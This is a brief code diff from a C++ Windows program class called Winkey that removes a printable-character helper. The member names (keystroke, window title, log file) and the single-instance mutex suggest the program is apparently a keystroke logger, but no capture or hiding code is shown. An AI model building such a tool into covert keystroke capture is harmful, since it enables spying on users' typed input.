@@ -6,11 +6,6 @@ std::wstring	Winkey::_windowTitle;
 std::wstring    Winkey::_keyStroke;
 HWND		    Winkey::_currentWindow;
 
-// Check if the character is a printable unicode character
-bool Winkey::isPrintable(wchar_t c) {
-    return (c >= 0x20 && (c < 0x7F || c >= 0xA0));
-}
-
 Winkey::Winkey() : _logFileName(TW_LOGFILE) {
     // Prevent multiple instances of this program
     _singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
